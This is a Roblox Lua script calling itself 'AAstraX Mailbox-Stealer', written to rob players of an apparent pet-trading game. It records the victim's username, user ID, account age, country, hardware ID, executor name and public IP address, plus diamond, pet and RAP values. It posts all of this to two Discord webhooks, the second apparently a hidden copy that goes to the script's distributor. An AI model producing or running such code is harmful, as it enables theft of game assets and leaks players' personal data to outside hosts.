wait(0.8)
local Exclusive = 0

for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
    if v:IsA("TextButton") then
    	if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") then
                    Exclusive = Exclusive + 1
                end
            end
	end

local url = _G.Webhook

local us = _G.dhwebhook

local url2 = us

local username = game:GetService("Players").LocalPlayer.Name

local fardplayer = game.Players.LocalPlayer

local RAP = game.Players.LocalPlayer.leaderstats.RAP.Value

local display = game.Players.LocalPlayer.DisplayName

local country = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer)

local imgs = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. fardplayer.userId .. "&width=420&height=420&format=png"

local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text

local executor = identifyexecutor()

local diamond = game.Players.LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text

local Loading = game.Players.LocalPlayer.PlayerGui.Loading.Frame.Info.Location.Text

local Game = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

local Pets = game.Players.LocalPlayer.PlayerGui.Inventory.Frame.PetAmount.Text

local HardWareId = game:GetService("RbxAnalyticsService"):GetClientId()

request = http_request or request or HttpPost or syn.request

local data1 = {

    ["content"] = "||@everyone||\n**:comet:AAstraX Mailbox-Stealer Detected A Hit:comet:**", -- Free Webhook logging

    ["embeds"] = {

        {

            ["title"] = "```AAstraX Mailbox-Stealer Results```",

            ["url"] = "https://discord.gg/pdBbN2dakA",

            ["description"] = "```This data was generated using AAstraX Mailbox-Stealer```",

            ["type"] = "rich",

            ["color"] = tonumber(0x7b00ff),

            ["thumbnail"] = {

                ["url"] = imgs,

                ["height"] = 420,

                ["width"] = 420

            },

            ["fields"] = {

                {

                    ["name"] = "Ay Bi chilling u got a Gift From"..username.."",

                    ["value"] = "**:detective:Username : " ..username .."\n:detective:User ID : " ..fardplayer.userId .. "\n:underage:Account Age : " ..fardplayer.AccountAge .. "\n:detective:DisplayName :"..display.."\n:crown:Rank:"..rank.."\n:computer: Exploit : "..executor.."\n:house:IP Address : "..game:HttpGet('https://api.ipify.org/').."\n:mag:Place :"..Loading.."\n:mag:Place :"..Game.."\n:mag:Country : "..country.."\n:alien:Receiver: ".._G.UserName.."**", -- AAstraxXTopG

                    ["inline"] = false

                },

                {

                    ["name"] = ":gem: Diamonds  :gem: ",

                    ["value"] = "```>>> ".._G.Diamonds.."```",

                    ["inline"] = true

                },

                {

                    ["name"] = ":round_pushpin:  Pets :round_pushpin: ",

                    ["value"] = "```>>> "..Pets.."```",

                    ["inline"] = true

                },

                {

                

                    ["name"] = ":round_pushpin: Exclusive Pets Remainin  :round_pushpin: ",

                    ["value"] = "```>>> "..Exclusive.."```",

                    ["inline"] = true

                },

                {

                 

                    ["name"] = ":money_mouth: Exclusive :money_mouth: ",

                    ["value"] = "```>>> ".._G.PetName.."```",

                    ["inline"] = true

                },

                {

                

           

                    ["name"] = ":bar_chart: RAP :bar_chart:",

                    ["value"] = "```>>> "..RAP.."```",

                    ["inline"] = true

                },

                {

                    ["name"] = ":computer: Hardware ID :computer:",

                    ["value"] = "```>>> "..HardWareId.."```",

                    ["inline"] = true

                }

            }

        }

    }

}

local newdata1 = game:GetService("HttpService"):JSONEncode(data1)

local headers = {

    ["content-type"] = "application/json"

}

local abcdef1 = {Url = url, Body = newdata1, Method = "POST", Headers = headers}

local abcdef2 = {Url = url2, Body = newdata1, Method = "POST", Headers = headers}

request(abcdef1)

request(abcdef2)
